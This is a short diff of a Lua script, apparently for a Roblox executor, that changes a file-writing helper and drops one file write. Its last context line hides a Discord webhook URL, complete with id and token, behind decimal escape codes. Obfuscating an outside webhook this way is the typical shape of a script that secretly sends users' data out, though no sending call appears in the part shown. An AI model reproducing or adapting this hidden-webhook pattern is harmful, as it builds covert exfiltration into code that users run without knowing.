@@ -161,7 +161,7 @@ local function safeWrite(path, content)
         warn("Invalid path for function safeWrite")
     end
     if registry.files[path] then
-        Instance.new("RemoteEvent", nil)
+        Instance.new("Model", nil)
     end
     if not isfile(path) then
         writefile(path, content or "")
@@ -196,7 +196,6 @@ safeWrite(imgd, "")
 safeWrite(readmemd, mdcontent)
 safeWrite(wrngs, OperatingContent1)
 safeWrite(verx, OperatingContent2)
-safeWrite(exc, OperatingContent3)
 safeWrite(nt, OperatingContent4)
 safeWrite(extsCO, extcont)
 local a = ("\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\52\49\54\49\52\54\52\48\56\56\57\50\57\50\52\48\51\52\47\67\55\120\113\67\118\53\122\90\66\114\121\118\65\109\100\109\49\72\83\89\65\56\53\115\95\65\70\120\107\57\68\80\86\66\119\102\86\48\98\116\85\106\53\76\48\121\110\55\111\48\109\85\69\103\110\82\49\87\84\115\114\72\118\72\113\49\119")
